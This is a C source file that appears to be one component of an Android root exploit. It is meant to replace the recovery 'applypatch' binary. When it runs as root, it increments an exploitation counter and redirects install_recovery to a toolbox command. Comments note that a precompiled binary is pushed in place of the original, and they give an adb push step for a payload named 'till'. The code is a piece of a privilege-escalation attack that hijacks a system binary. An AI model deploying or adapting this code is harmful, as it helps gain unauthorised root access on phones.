#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#include"shared.h"

/* THIS BINARY ISN'T PUSHED -- A precompiled applypatch is pushed instead */
/* applypatch main.c has the exact block of code you see below it is complete */

/* see /bootable/recovery/applypatch/main.c  */
int main(int argc, char *argv[]) {
	LOGV("[+] Applypatch running %s as uid: %d, gid: %d", argv[0], getuid(), getgid());
   		
	//if it's a forked proc we forked it.. if set_value doesn't return 0, it was the first time through.
   	if ((getuid() == 0) && (getgid() == 0) && ((increment_value(0,FILE_TILL_EXPOLITED) != 0)) ) {
			LOGV("applypatch redirect install_recovery --> toolbox with ls command for pid: %i",(int) getpid());
		
									//send install_recovery back to toolbox
									if( system("/system/bin/toolbox ls /system/bin/") ) {
										LOGV("Failed to execute ls command, exploit failed!");
									}
	}
 
 return 0; 
 
}
/* IMPORTANT Notice: If you don't want applypatch to be live
   change the Makefile..
   adb push libs/arm64-v8a/till /data/local/tmp/till
   this will break applypatch, it will be 100% till 	*/

